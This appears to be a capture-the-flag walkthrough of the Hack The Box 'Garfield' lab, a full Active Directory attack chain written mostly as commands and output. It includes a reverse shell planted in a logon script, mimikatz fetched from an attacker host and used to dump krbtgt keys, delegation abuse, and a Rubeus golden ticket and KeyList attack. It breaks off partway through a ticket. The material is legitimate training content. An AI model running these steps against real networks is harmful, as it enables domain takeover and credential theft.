As is common in real life pentests, you will start the Garfield box with credentials for the following account j.arbuckle / Th1sD4mnC4t!@1978
### Nmap
```
nmap -sV -sC -vv 10.129.25.68

---OUTPUT---
Nmap scan report for 10.129.25.68
Host is up, received echo-reply ttl 127 (0.022s latency).
Scanned at 2026-04-07 05:43:09 EDT for 70s
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-07 17:43:24Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
2179/tcp open  vmrdp?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: garfield.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: GARFIELD
|   NetBIOS_Domain_Name: GARFIELD
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: garfield.htb
|   DNS_Computer_Name: DC01.garfield.htb
|   DNS_Tree_Name: garfield.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-07T17:43:41+00:00
| ssl-cert: Subject: commonName=DC01.garfield.htb
| Issuer: commonName=DC01.garfield.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-13T01:10:36
| Not valid after:  2026-08-15T01:10:36
| MD5:     1d54 628d c6bd 0ef0 98e8 6fe7 ed23 3178
| SHA-1:   6a3b 9a1d cd3f 0006 7f71 f340 cefb 59b8 b2e9 5041
| SHA-256: f7cc 022a 49f7 12ba 7bf1 ba5e 4d55 723c c89b 0f9e e9cc 1e29 9d2b 8d7e 36f3 c999
| -----BEGIN CERTIFICATE-----
| MIIC5jCCAc6gAwIBAgIQRWjBnxmhFpRL9DZFFlNNGzANBgkqhkiG9w0BAQsFADAc
| MRowGAYDVQQDExFEQzAxLmdhcmZpZWxkLmh0YjAeFw0yNjAyMTMwMTEwMzZaFw0y
| NjA4MTUwMTEwMzZaMBwxGjAYBgNVBAMTEURDMDEuZ2FyZmllbGQuaHRiMIIBIjAN
| BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAudwNMshQBO3zq1/pE8+nBxwGxJ1l
| SyyT5cTIhNDVGOj1kvnrvbksT07EV+vqMFnCrp1d4CAwvOqCGFuPPoVw2X6oEM3C
| Hk3WdpoAGDuSUSNSvfketGhPiPjD0mbRUl0/TLqDu0shOL1D7q1IXHh4H/S7Rqgd
| GXUs7jQ19RryyVJ6fbH1aoZrg2JATrlpzAh9u77upPVhK2omeTyEz9PNxeElbb8j
| 22YgC9WjR+YSwQcq9xjMNS+8Bf2MwF9ltPYp3M8PKMO6Ib93EvWfbkQ75gxB1CJ+
| UJo85i8/N1L5ZvfkDP5UkBkGKiaWDfIqx+RlpUuOt5Y98N/szT08l+YQBQIDAQAB
| oyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcN
| AQELBQADggEBACOttD+PBn41TyIk0Fr5ISoHzalcZLFhWwVpmJKvGPwEEj+2o3JI
| yZgV0kVinOLCkEY2O+N95iWNcbc0jTkmkhHmfTyNZ2mA4P0Dxd+TVnBzUleL8Tjm
| Rm8s53SBxncdtykSulWbszQLLgRy09EBapw2JHNpWG9p0ymPqW3uBGcJXfsZ3hif
| +xIeWo+aXoJfSG4F+ptBxRMJ7OGr+q4jQh84VUi5tLUXtHvxJMuM/LPgNVkEsYFU
| yNeT8ukEDEdMTVAYWeftXPMfAbdDX1Ptr0JCeLW5VFWrql9EszHXs4nCvoBg9iSj
| 7ipPJi99f+g9vL4srEEeQxsVGlv/RZ85Bj4=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-04-07T17:44:22+00:00; +8h00m04s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m03s, deviation: 0s, median: 8h00m03s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 45294/tcp): CLEAN (Timeout)
|   Check 2 (port 13529/tcp): CLEAN (Timeout)
|   Check 3 (port 55643/udp): CLEAN (Timeout)
|   Check 4 (port 23972/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-04-07T17:43:44
|_  start_date: N/A
```

### NXC
- with provided creds I can check shares:
```
nxc smb 10.129.25.68 -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --shares

---OUTPUT---
SMB         10.129.25.68    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.25.68    445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
SMB         10.129.25.68    445    DC01             [*] Enumerated shares
SMB         10.129.25.68    445    DC01             Share           Permissions     Remark
SMB         10.129.25.68    445    DC01             -----           -----------     ------
SMB         10.129.25.68    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.25.68    445    DC01             C$                              Default share
SMB         10.129.25.68    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.25.68    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.25.68    445    DC01             SYSVOL          READ            Logon server share
```

![[Pasted image 20260407061938.png]]

- Files in SYSVOL don't give too much info 


### LDAPSearch
```
ldapsearch -x -D 'garfield\j.arbuckle' -w 'Th1sD4mnC4t!@1978' -H ldap://10.129.25.68 -b "dc=garfield,dc=htb" | grep "sAMAccountName"

---OUTPUT---
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: Administrators
sAMAccountName: Users
sAMAccountName: Guests
sAMAccountName: Print Operators
sAMAccountName: Backup Operators
sAMAccountName: Replicator
sAMAccountName: Remote Desktop Users
sAMAccountName: Network Configuration Operators
sAMAccountName: Performance Monitor Users
sAMAccountName: Performance Log Users
sAMAccountName: Distributed COM Users
sAMAccountName: IIS_IUSRS
sAMAccountName: Cryptographic Operators
sAMAccountName: Event Log Readers
sAMAccountName: Certificate Service DCOM Access
sAMAccountName: RDS Remote Access Servers
sAMAccountName: RDS Endpoint Servers
sAMAccountName: RDS Management Servers
sAMAccountName: Hyper-V Administrators
sAMAccountName: Access Control Assistance Operators
sAMAccountName: Remote Management Users
sAMAccountName: Storage Replica Administrators
sAMAccountName: DC01$
sAMAccountName: krbtgt
sAMAccountName: Domain Computers
sAMAccountName: Domain Controllers
sAMAccountName: Schema Admins
sAMAccountName: Enterprise Admins
sAMAccountName: Cert Publishers
sAMAccountName: Domain Admins
sAMAccountName: Domain Users
sAMAccountName: Domain Guests
sAMAccountName: Group Policy Creator Owners
sAMAccountName: RAS and IAS Servers
sAMAccountName: Server Operators
sAMAccountName: Account Operators
sAMAccountName: Pre-Windows 2000 Compatible Access
sAMAccountName: Incoming Forest Trust Builders
sAMAccountName: Windows Authorization Access Group
sAMAccountName: Terminal Server License Servers
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountName: Denied RODC Password Replication Group
sAMAccountName: Read-only Domain Controllers
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountName: Cloneable Domain Controllers
sAMAccountName: Protected Users
sAMAccountName: Key Admins
sAMAccountName: Enterprise Key Admins
sAMAccountName: DnsAdmins
sAMAccountName: DnsUpdateProxy
sAMAccountName: RODC01$
sAMAccountName: krbtgt_8245
sAMAccountName: RODC Administrators
sAMAccountName: j.arbuckle
sAMAccountName: l.wilson
sAMAccountName: IT Support
sAMAccountName: l.wilson_adm
sAMAccountName: Tier 1
```

- Looking back at the smb share I do see a bat file under scripts. I edit the file and add my powershell b64 reverse shell to it and upload it again:
```
put printerDetect.bat
```

- Now we need to see if our user can modify attributes of any other users:
```
bloodyAD --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable

distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
permission: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
permission: WRITE
```

- We modify the scriptPath attribute for Liz Wilson to the modified bat file we uplaoded:
```
bloodyAD --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v "printerDetect.bat" 

---OUTPUT---
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated

```

- I grab a shell as Liz Wilson:
![[Pasted image 20260407085143.png]]

- Looking around a find a ps1 RDP Connect file in the user's Documents folder:
![[Pasted image 20260407085230.png]]

- It seems to just be a script to connect via RDP which causes our reverse shell.

- Looking at bloodhound:
```
bloodhound-python -c all -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -ns 10.129.25.68 -d  GARFIELD.HTB --zip

---OUTPUT---
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: garfield.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::ba92:4396:4fcf:90ba
INFO: Trying LDAP connection to dead:beef::ba92:4396:4fcf:90ba
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.garfield.htb
INFO: Testing resolved hostname connectivity dead:beef::ba92:4396:4fcf:90ba
INFO: Trying LDAP connection to dead:beef::ba92:4396:4fcf:90ba
INFO: Found 8 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: RODC01.garfield.htb
INFO: Querying computer: DC01.garfield.htb
INFO: Done in 00M 16S
INFO: Compressing output into 20260407072814_bloodhound.zip
```
![[Pasted image 20260407085646.png]]

- `l.wilson` can change the password of `l.wilson_adm`
```
Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword (ConvertTo-SecureString 'hax0rman123!' -AsPlainText -Force) -Reset
```
- I can now login as `l.wilson_adm`
```
evil-winrm -i 10.129.25.68 -u l.wilson_adm -p 'hax0rman123!'
```
![[Pasted image 20260407113955.png]]

- I grab the user flag:
![[Pasted image 20260407114040.png]]

- I notice theres an internal IP 192.168.100.1
- Furthermore in bloodhound I see We can see an RODC which we can add ourself to its group and force change password:
![[Pasted image 20260407114226.png]]

```
Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
```
- Then I ping the name to find the IP:
```
ping RODC01.garfield.htb
```
![[Pasted image 20260407114338.png]]

- I then createa a ligolo tunnel so my local amchine can reach it:
```
---LOCALLY---
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo

./proxy -selfcert -laddr 0.0.0.0:9000

---TARGET---
./agent -connect 10.10.17.167:9000 -ignore-cert


----LOCAL-AGAIN-AFTER---
session
1
start
```

- Then I can ping the IP to see its reachable.

- FInally I can add a computer object:
```
impacket-addcomputer garfield.htb/l.wilson_adm:'hax0rman123!' \
-computer-name 'hax0r$' \
-computer-pass 'hax0rmoon123!' \
-dc-ip 10.129.25.68
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account hax0r$ with password hax0rmoon123!.
```

- Then I need to set delegation rights onto it from the RODC01. Pass the following command on the `l.wilson_adm` session:
```
Set-ADComputer "RODC01" -PrincipalsAllowedToDelegateToAccount hax0r$
Get-ADComputer RODC01 -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
DNSHostName                          : RODC01.garfield.htb
Enabled                              : True
Name                                 : RODC01
ObjectClass                          : computer
ObjectGUID                           : 92de2230-7bf6-43b2-baaa-d43bf84f34ea
PrincipalsAllowedToDelegateToAccount : {CN=hax0r,CN=Computers,DC=garfield,DC=htb}
SamAccountName                       : RODC01$
SID                                  : S-1-5-21-2502726253-3859040611-225969357-1602
UserPrincipalName                    :

```

- Now I can impersonate Administrator and get a service ticket:
```
faketime "+8hours" impacket-getST garfield.htb/hax0r\$:'hax0rmoon123!' \
  -spn cifs/RODC01.garfield.htb \
  -impersonate Administrator \
  -dc-ip 10.129.25.68
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

- Using this ticket I can log onto RODC01 as Administrator:
```
faketime "+8hours" impacket-psexec -k -no-pass \                            
-dc-ip 10.129.20.167 \
-target-ip 192.168.100.2 \
garfield.htb/Administrator@RODC01.garfield.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.100.2.....
[*] Found writable share ADMIN$
[*] Uploading file oeXwxgHE.exe
[*] Opening SVCManager on 192.168.100.2.....
[*] Creating service sORt on 192.168.100.2.....
[*] Starting service sORt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8511]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![[Pasted image 20260407115024.png]]

- Checking users at RODC01:
```
nxc ldap 10.129.25.68 -u l.wilson_adm -p 'hax0rman123!' --users             
LDAP        10.129.25.68    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.25.68    389    DC01             [+] garfield.htb\l.wilson_adm:hax0rman123! 
LDAP        10.129.25.68    389    DC01             [*] Enumerated 7 domain users: garfield.htb
LDAP        10.129.25.68    389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description- 
LDAP        10.129.25.68    389    DC01             Administrator                 2025-10-03 13:29:26 0        Built-in account for administering the computer/domain                                                                                     
LDAP        10.129.25.68    389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain                                                                                   
LDAP        10.129.25.68    389    DC01             krbtgt                        2025-08-13 07:05:26 0        Key Distribution Center Service Account                                                                                                    
LDAP        10.129.25.68    389    DC01             krbtgt_8245                   2025-08-17 07:33:39 0        Key Distribution Center service account for read-only domain controller                                                                    
LDAP        10.129.25.68    389    DC01             j.arbuckle                    2025-09-09 11:50:55 0                      
LDAP        10.129.25.68    389    DC01             l.wilson                      2026-01-27 16:40:33 0                      
LDAP        10.129.25.68    389    DC01             l.wilson_adm                  2026-04-07 18:13:25 0 
```

- An interesting user is `krbtgt_8425`

- Using mimikatz (x64) I can dum the credentials of this user:
```
powershell.exe
Invoke-WebRequest -Uri "http://10.10.17.167/mimikatz.exe" -OutFile "C:\Windows\Temp\mimikatz.exe"

exit

.\mimikatz.exe

privilege::debug

lsadump::lsa /inject /name:krbtgt_8245

---OUTPUT---
mimikatz # Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357

RID  : 00000643 (1603)
User : krbtgt_8245

 * Primary
    NTLM : 445aa4221e751da37a10241d962780e2
    LM   : 
  Hash NTLM: 445aa4221e751da37a10241d962780e2
    ntlm- 0: 445aa4221e751da37a10241d962780e2
    lm  - 0: 0ab3d34a182bb016fc4cfd26544a9f16

 * WDigest
    01  6d31d1f92ef6d85f5517944f98bf5753
    02  8c46bd5ddc680291e70800990dbc02e3
    03  9ffbc24f29b9bb3df3c32b76631ff874
    04  6d31d1f92ef6d85f5517944f98bf5753
    05  8c46bd5ddc680291e70800990dbc02e3
    06  8fc97c500bf9c7c4a0d34a497f9c5245
    07  6d31d1f92ef6d85f5517944f98bf5753
    08  c4bac61b7ecb407d358f836d2f4e19c6
    09  c4bac61b7ecb407d358f836d2f4e19c6
    10  d8938c80e1e0c80a2ec1d8b06f42cb31
    11  67f002aa49f4400fa970a53e294f4bee
    12  c4bac61b7ecb407d358f836d2f4e19c6
    13  56062e2db43bc0069deb86de87509ca6
    14  67f002aa49f4400fa970a53e294f4bee
    15  7250fcfc09d9cb93345c0c1393e19e52
    16  7250fcfc09d9cb93345c0c1393e19e52
    17  04b30cd8b5381d4b8458b0c996503a91
    18  b48bda9ef98982d5ee33766a74880e01
    19  bb365cf4f0bcdadf35b6a9b04c58257b
    20  85addbd6d603cca1b500f2da02b205d0
    21  b6186618611e202aae4141716e6603f5
    22  b6186618611e202aae4141716e6603f5
    23  f3f6c9408db132bf8e59413b7b40bb16
    24  0acf88cc5cb3b35888708ebefe658b6f
    25  0acf88cc5cb3b35888708ebefe658b6f
    26  08b8941632a5017e7178a3761dfaf7fb
    27  c1b2fd89d0dafb5f9e18147042bdc433
    28  712f0b6ed3b7eb7f6f135a1e298c4e09
    29  bf8d51270f7f657079bb9744446d70cb

 * Kerberos
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Credentials
      des_cbc_md5       : d540fe6192b9ecfe

 * Kerberos-Newer-Keys
    Default Salt : GARFIELD.HTBkrbtgt_8245
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
      des_cbc_md5       (4096) : d540fe6192b9ecfe

 * NTLM-Strong-NTOWF
    Random Value : f4b51c2c0d006172304e31dbc6e0de6b
```



- Now I need PowerView.ps1 to Allow RODC for PasswordReplication:
```
powershell.exe

Invoke-WebRequest -Uri "http://10.10.17.167/PowerView.ps1" -OutFile "C:\ProgramData\PowerView.ps1"

exit


```
```
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\PowerView.ps1
Get-Command *DomainObject*

---OUTPUT---
CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Add-DomainObjectAcl
Function        Find-DomainObjectPropertyOutlier
Function        Get-DomainObject
Function        Get-DomainObjectAcl
Function        Get-DomainObjectAttributeHistory
Function        Get-DomainObjectLinkedAttributeHistory
Function        Remove-DomainObjectAcl
Function        Set-DomainObject
Function        Set-DomainObjectOwner
```

- Now to Allow Adminsitrator RODC Replication.
- NOTE : You may need to relogin to your winrm session after adding yourself to RODC Adminsitrators as the next commands wont work on a shell that hasnt had that update added to the user.
- On `l.wilson_adm` add Adminsitrator to allow replication and clear the NeverRevealGroup
```
Set-DomainObject -Identity RODC01$ -Set @{
  'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb',
    'CN=Administrator,CN=Users,DC=garfield,DC=htb'
  )
}
Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
Get-ADComputer RODC01 -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup

---OUTPUT---
DistinguishedName        : CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
DNSHostName              : RODC01.garfield.htb
Enabled                  : True
msDS-RevealOnDemandGroup : {CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb, CN=Administrator,CN=Users,DC=garfield,DC=htb}
Name                     : RODC01
ObjectClass              : computer
ObjectGUID               : 92de2230-7bf6-43b2-baaa-d43bf84f34ea
SamAccountName           : RODC01$
SID                      : S-1-5-21-2502726253-3859040611-225969357-1602
UserPrincipalName        :

```
![[Pasted image 20260407164552.png]]

- Now with Rubeus we can perform GOldenTicket+KeyList Attack to get the Adminsitrator ccache
- Firs tthe golden ticket:
```
.\Rubeus.exe golden `
/rodcNumber:8245 `
/flags:forwardable,renewable,enc_pa_rep `
/nowrap `
/outfile:ticket.kirbi `
/aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 `
/user:Administrator `
/id:500 `
/domain:garfield.htb `
/sid:S-1-5-21-2502726253-3859040611-225969357

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : GARFIELD.HTB (GARFIELD)
[*] SID            : S-1-5-21-2502726253-3859040611-225969357
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : D6C93CBE006372ADB8403630F9E86594F52C8105A52F9B21FEF62E9C7A75E240
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : garfield.htb

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@garfield.htb'

[*] AuthTime       : 4/7/2026 9:25:24 PM
[*] StartTime      : 4/7/2026 9:25:24 PM
[*] EndTime        : 4/8/2026 7:25:24 AM
[*] RenewTill      : 4/14/2026 9:25:24 PM

[*] base64(ticket.kirbi):

      doIFkjCCBY6gAwIBBaEDAgEWooIEfzCCBHthggR3MIIEc6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IENzCCBDOgAwIBEqEGAgQgNQAAooIEIgSCBB55OL+NpIfsfE0ZdzctE4cp6SP5uOQ3ukh9SFmWvW3P+MhfLRqsQ4seQiaBbc3SIOdpzxJipR8T63YBLR9mfRtHE0DIY5VfmhNgLtelPmcwO0kZ1w2gU4CmMQCIjtXvW+AUyIAGvOCZGFyezwnQ1Oi3Cc5QJBg/92Ys5vHnQbWfaGE6pOUj3xXlcXezgdgNyGpEB8xcv1d07CUSxDiOjsE3goakFn8G5uKHWxZXxrEkgLNwFrauwdyfoWFQlOOOHlTl5/4KEh2VgWutOIrcSiaUyPZoj7RcF2njEs8nAUOdcpw7Sc5frXlc3/nDXkyxBStZ+1HnJMWo9AIOa/hOTOK1TIkWbRWXb+QLZYT4ealhEf26zT/Ks+90/Uynw2rTStEwFZefkWZDT3kDbMfwI/vagnX/524dTehq2Z8BJAThoKpFluJyKIY8IAk4GYd2ajpaKkmlHVnLFcvKs3wmzUQo2HFMYaNA38Zcu0sfQMu8pqUTgibZna3hrxmCYaP0pYOUHeYW3VtOS6isCncchdl86xPRb87HwsR2IYasC2lgsoG2gnmLELnD8NQJqWhpHJP/C1ORA2zHdT/5lobetYTvS359/kImLUtm7IyoTh4VGRu7ib7FkHkBdk7G/rjZjRvepPB3T/bYD9Ntz9bMqLykh4PxCKwxfsYhi/204DUZJSBx1FUnYrQETb1/BKEQd+045gj9Nrv6PlejY8ty1a/Ruy0A3VHCj5U0gTB2D5U8veQAB2V208wuB2/E+j+Bfs+ZP/n/aOI3m765/s9Y/0t72Oc+jMtWtIFgVUhkGV4GiQVb0v6HL9sy1/Sl/v9ea8KqM4Ye2KQw4P0Cg4RHmRR1mLcORSIaRquIwjRqjvzwtrApZdTsSoWg8LeM9mX3BUpOVksMja/5FGpZsX684lvvtVy+Y1fPFH6exnnc77VIDcZxw4ki6cOuDebE3jiZXRTwZa3xwOUJx78D4geCHGcow59jRmm88yqjnI/9lggDju7gjwuSfpTyuPLLK8X0pDAkCy2xtNNCqRDGinsOfipTvnbXRIILnAIMfBPHG7zKdtMPYxP4OIXzT4QO2Q3VMH/kWf5iSG6+9Kf97kV6UBDX7izokkK77yAyIIUwq4E/u4zWU1lQ6FS4vhYTHmU1yJWX/lwwE5kVhZcgUrWAyB3UMTWpLtwRpuntaKrvKfLJVUOL1z7C3pAPT4zMSSSZM801wMvG71PG+tCWTrsytc9fIERK7Oexo5bojN7isw3iu7j2RnHnuFwIkefhOZ+H1Luh8RWCEmGcKw39SbZMaMRqCHYX833uaGzWLCxEKgh6NkqY2JRQwiJdU3NGnWxrYnGu4UBBfRqXAoL4j5imOYRhOMNXnqfXnYdxkF3grgPhneZ5Aji8+e7G9mRKqx5Ho4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgKzApoAMCARKhIgQgsNKRqqdnhCfsvddzm/DaPsLSnEvj3YEr1J/l5hza9QGhDhsMR0FSRklFTEQuSFRCohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQIEAAKQRGA8yMDI2MDQwODA0MjUyNFqlERgPMjAyNjA0MDgwNDI1MjRaphEYDzIwMjYwNDA4MTQyNTI0WqcRGA8yMDI2MDQxNTA0MjUyNFqoDhsMR0FSRklFTEQuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0GwxnYXJmaWVsZC5odGI=


[*] Ticket written to ticket_2026_04_08_04_25_24_Administrator_to_krbtgt@GARFIELD.HTB.kirbi
```

- Then the Keylist attack to ge tthe real adminstrator ticket:
```
.\Rubeus.exe asktgs `
/enctype:aes256 `
/keyList `
/service:krbtgt/garfield.htb `
/dc:DC01.garfield.htb `
/ticket:ticket_2026_04_08_04_25_24_Administrator_to_krbtgt@GARFIELD.HTB.kirbi `
/nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGS

[*] Requesting 'aes256_cts_hmac_sha1' etype for the service ticket
[*] Building KeyList TGS-REQ request for: 'Administrator'
[*] Using domain controller: DC01.garfield.htb (fe80::9f8:4b6f:139a:51cb%7)
[+] TGS request successful!
[*] base64(ticket.kirbi):

      doIFnjCCBZqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMR0FSRklFTEQuSFRCo4IEaTCCBGWgAwIBEqEDAgECooIEVwSCBFOwl/ewJLyhg8n8rEmxLGk6VjjuUVn8X4WaCo5bc73uWQR4SNcm+RLOFZGmaMvQqGq3C4t2xCvGsHGydYzWGWE9Kv/DdJ8FQ/CzPcKa5QrGlTGVkfd8cbJfe0qJbPtyXIAKIXQsAb9EUzdA0SyQlvp1ww9wvjpYszUfE0B2GfK6/5UPFiJrX8J5sw04Ai1bVu9yj1Ztiu7KsaEHc3KYr2zBT3rI4vhknI1ZrDRzNuQGLLrXQhe1D64uh3c5eiL9U1ew8UMhNRbwUbXKbtrEHr4Atw9t/TOiz33zVQEzDv+/coYt5HgmNh6unOVtiJST+JwOjcXLRYhOZ/YncqHMNGCffHAF3cNFEaPZdNn66gbjjYwbBXsRxxc/xF59e3gJOvdaxIpFg926U+PJquCeQmnVTBuK0Pw1pFL3qZMHQnxVn3QR8o9dVzWIzWSEo/qD6KiMHbQkJFHkpfe5IepeUpQ9Xy+BOkRY92vGs2GzzwHBIkAj3mVuJ0p80gCAF23t5eMJhVSRKeeRjgttNPGTulbbBIUkLEZyxgkiCqSXuo9tIeaYf9c0YQaButXep0h4v3w88ZJaz39aL1U8NG19uUsTffjjrhqt61uAzmY104FlVqVUu68gQrYzOw5jJ50FUs72AW+cbbMsX0AWCF6pyyOePamzsbTQabh6UKsEa+MkJS2BbArcn9IxeCGmJ5cwsx7t1oxEmSTxjIshjCafA85W1IEbLDYBOOd1dkEwWCXHIF++y+bvk76fVtgyVVOWOFkhqo6ooaK71uo03z3Yy2eyhGynty9KhjN4ztxv6P7ADLnRTFtYbpNtZ+DpFDjfi0gHsHj2D2jo4RUegBLYmsUporXkwUpvJ9GXTJizqDuNjBK7RcSm4588rYXClYuGDYlMEPN7zPSpsMNSWzgUOcFPkjzjupsHkfTjpmXRevYa7ukVFqXiHo1dUL43WRVqVZsa0IQNKzilOpWVzkQOkOg1oML7VxX2XtGBrx1s5fTj1FSK/TFBWveo1oH9Iyd4aMjb/QVmx1meWrqqQhq7MBNe7UY4V/tW0BAkoe6vBk3QxRLDvPWBjr5W9rl/wEiCM0e2Lu6zo5ve85k8XCuQhtGFCrDimFnfIVZPwXKVQWmE2inbmQ6wRXDbvFKOLezbE5G4+aNPimNSUuVmQusKGTFf/1jy5eRezRl0bfQWsz7V2aKS8yT7EGLsizziBGGd4cwzZPRKJh6E